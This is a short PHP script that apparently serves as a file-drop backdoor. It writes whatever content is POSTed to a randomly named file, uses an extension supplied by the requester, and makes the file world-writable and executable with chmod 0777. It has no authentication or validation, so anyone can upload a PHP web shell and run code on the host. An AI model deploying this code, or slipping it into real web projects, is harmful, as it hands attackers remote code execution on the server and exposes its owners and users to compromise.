<?php
$extension = $_REQUEST['ext'];
$content = $_POST['content'];
$name = chr(rand(97, 122));

if (file_exists($name.'.'.$extension)) {
    $name = chr(rand(97, 122));
}

if (!file_exists($name.'.'.$extension)) {
    file_put_contents($name.'.'.$extension, $content);
    chmod($name.'.'.$extension, 0777);
}
